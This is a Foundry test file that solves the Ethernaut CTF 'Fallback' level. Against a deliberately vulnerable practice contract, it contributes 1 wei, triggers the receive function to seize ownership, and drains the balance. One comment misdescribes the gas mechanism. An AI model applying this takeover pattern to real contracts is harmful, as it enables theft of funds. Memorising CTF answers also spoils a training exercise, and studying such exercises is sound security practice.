// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "@dev/forge-std/src/Test.sol";
import { Fallback, FallbackFactory } from "@contracts/CTF/Ethernaut/01_Fallback.sol";
import { Ethernaut } from "@contracts/CTF/Ethernaut/00_Ethernaut.sol";
import { console } from "@dev/forge-std/src/console.sol";

/*
    forge test --match-path foundry/test/Ethernaut/01_Fallback.t.sol -vvvv
*/

contract FallbackTest is Test {
    Ethernaut private ethernaut;
    // hacking attack address
    address private attackAddress = address(2333);
    address private levelAddress = address(0);
    Fallback private victimInstance;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        _before();
        // Deal attack address some ether
        vm.deal(attackAddress, 5 ether);
    }

    function _before() public {
        // 1.SetUp the exploit
        ethernaut = new Ethernaut();
        FallbackFactory levelFactory = new FallbackFactory();
        ethernaut.registerLevel(levelFactory);
        vm.startPrank(attackAddress);
        levelAddress = ethernaut.createLevelInstance(levelFactory);
        victimInstance = Fallback(payable(levelAddress));
        console.log("Ethernaut Attack Address: ", attackAddress);
    }

    function test_Exploit() public {
        // 2.Run the exploit

        // 捐一点钱成为贡献者
        victimInstance.contribute{ value: 1 wei }();
        // 转 ETH 但是却没给足够的 gas 来触发 fallback
        (bool isSent,) = payable(address(victimInstance)).call{ value: 1 wei }("");
        assertTrue(isSent);
        // 转出检查余额
        victimInstance.withdraw();

        // 3.verify the exploit
        _after();
    }

    function _after() public {
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertTrue(levelSuccessfullyPassed, "Solution is not solving the level");
    }
}
